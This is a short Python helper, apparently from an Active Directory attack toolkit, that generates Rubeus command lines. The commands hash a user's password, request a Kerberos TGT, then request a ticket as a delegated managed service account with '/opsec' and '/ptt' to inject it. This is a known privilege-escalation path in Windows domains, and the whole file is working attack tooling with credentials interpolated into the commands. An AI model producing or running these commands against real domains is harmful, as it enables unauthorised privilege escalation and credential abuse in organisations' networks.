"""Kerberos command guidance helpers."""

import re

from .ad_utils import is_ipv4_address, normalized_dmsa_name, resolve_ipv4_address


DEFAULT_DMSA_NAME = 'redpen'


def ticket_name_for_user(username):
    value = re.sub(r'[^A-Za-z0-9_.-]+', '_', str(username or '').strip())
    return '%s.kirbi' % (value or 'tgt')


def kerberos_guidance_lines(domain, username, password, dmsa_name, dc_host=None, dc_ip=None, default_dmsa_name=DEFAULT_DMSA_NAME):
    dc_ipv4 = None
    if dc_ip:
        dc_ipv4 = str(dc_ip).strip() if is_ipv4_address(dc_ip) else resolve_ipv4_address(dc_ip, usable_only=True)
    if not dc_ipv4:
        dc_ipv4 = resolve_ipv4_address(dc_host, usable_only=True)
    dc_ipv4 = dc_ipv4 or '<DC_IPV4>'
    domain = str(domain or '').strip() or '<DOMAIN>'
    username = str(username or '').strip() or '<USERNAME>'
    password = str(password or '').strip() or '<PASSWORD>'
    dmsa_name = normalized_dmsa_name(dmsa_name) or default_dmsa_name
    realm = domain.upper()
    ticket_path = ticket_name_for_user(username)
    dc_hint = 'Use /dc:%s as an IPv4 address to avoid IPv6 link-local resolution.' % dc_ipv4
    if dc_ipv4 == '<DC_IPV4>':
        dc_hint = 'Set --dc-ip to a specific DC IPv4 before using these Kerberos commands.'
    return [
        'Next Kerberos step must be verified outside this script.',
        dc_hint,
        r'.\Rubeus.exe hash /user:%s /password:%s /domain:%s' % (username, password, domain),
        r'.\Rubeus.exe asktgt /user:%s /aes256:<AES256_HASH_FROM_RUBEUS_HASH> /domain:%s /dc:%s /outfile:%s /nowrap' % (username, domain, dc_ipv4, ticket_path),
        r".\Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/%s /targetuser:'%s$' /ticket:%s /dc:%s /ptt /nowrap" % (realm, dmsa_name, ticket_path, dc_ipv4),
    ]
